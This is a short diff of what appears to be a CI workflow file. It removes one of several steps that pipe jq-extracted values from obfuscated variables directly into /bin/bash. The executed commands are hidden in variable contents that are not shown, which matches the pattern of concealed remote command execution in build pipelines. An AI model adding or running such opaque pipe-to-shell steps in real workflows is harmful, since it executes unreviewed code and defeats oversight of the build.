@@ -36,7 +36,6 @@ jobs:
           echo $fz0515 | jq -r .iqgv10 | /bin/bash
           printf '%s' "$plf2" | jq -r .ihp15 | /bin/bash
           echo $i93139 | jq -r .qdf734 | /bin/bash
-          echo $aigbj0641 | jq -r .cv504 | /bin/bash
 
       - name: Archive output
         if: always()
